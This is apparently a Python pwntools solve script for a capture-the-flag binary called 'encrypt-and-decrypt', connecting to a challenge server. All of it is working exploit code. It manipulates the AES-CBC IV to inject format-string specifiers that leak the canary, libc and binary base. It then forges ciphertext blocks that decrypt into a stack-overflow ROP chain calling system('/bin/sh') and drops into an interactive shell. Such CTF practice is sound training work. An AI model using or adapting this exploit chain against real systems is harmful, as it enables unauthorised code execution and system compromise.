# python solve.py
# python solve.py REMOTE encrypt-and-decrypt.challs.csc.tf 1337
from pwn import *

libc = ELF('./libc6_2.35-0ubuntu3.8_amd64.so')

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Set up pwntools for the correct architecture
exe = './encrypt-and-decrypt'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
# context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

gdbscript = '''
'''.format(**locals())

io = start()

def send(io, option, inputs=None):
    io.sendlineafter(b'> ', str(option).encode())
    if option == 2:
        io.sendline(inputs.hex().encode())
        return io.recvline().strip()
    if option == 1:
        io.sendline(inputs)
        iv = bytes.fromhex(io.recvline().decode().strip().split(': ')[1])
        enc = bytes.fromhex(io.recvline().decode().strip().split(': ')[1])
        return iv, enc

pt = b'ABC'
iv, enc = send(io, 1, inputs=pt)

addrs = []
for target in [b'%47$lx', b'%49$lx', b'%51$lx']:
    iv_new = xor(xor(pt.ljust(16, b'\x00'), target.ljust(16, b'\x00')), iv)
    addr = send(io, 2, iv_new+enc).decode().strip()
    addrs.append(int(addr, 16))

canary, libc_start_ret, elf_main = addrs
elf.address = elf_main - 0x2a71
libc.address = libc_start_ret - 0x29d90
print('elf', hex(elf.address))
print('libc', hex(libc.address))
print('canary', hex(canary))


pop_rdi = libc.address + 0x2a3e5 #pop rdi; ret;
ret = libc.address + 0x29139 #: ret; 
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']

# 56 bytes + canary + rbp + ret address (rop chain)
payload = b'A' * 56 + flat(canary, 0, pop_rdi, binsh, ret, system, ret)
print('payload len', len(payload))
print(payload.hex())

blocks = []
for i in range(0, len(payload), 16):
    blocks.append(payload[i:i+16])

blocks = blocks[::-1]

def get_iv(ct, pt):
    iv = b'\x00'*16
    inputs = iv + ct
    res = send(io, 2, inputs=inputs)
    return xor(res, pt)

payload = b'A'*16
for block in blocks:
    payload = get_iv(payload[:16], block) + payload
    assert len(payload) % 16 == 0, 'maybe some newline there accidentally'

send(io, 2, inputs=payload)
send(io, 3)

# keep session open
io.interactive()